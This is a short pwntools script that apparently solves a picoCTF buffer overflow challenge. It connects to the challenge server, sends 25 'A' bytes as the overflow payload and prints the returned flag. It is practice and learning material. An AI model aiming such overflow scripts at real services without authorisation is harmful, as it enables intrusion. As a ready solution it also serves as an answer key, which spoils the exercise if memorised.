from pwn import *

# p = process("./local-target")
p = remote("saturn.picoctf.net", 55512)

p.recvuntil("Enter a string: ")

p.sendline(b'A'*25) # send payload
p.recvuntil("You win!\n")

flag = p.recvline()
print(flag)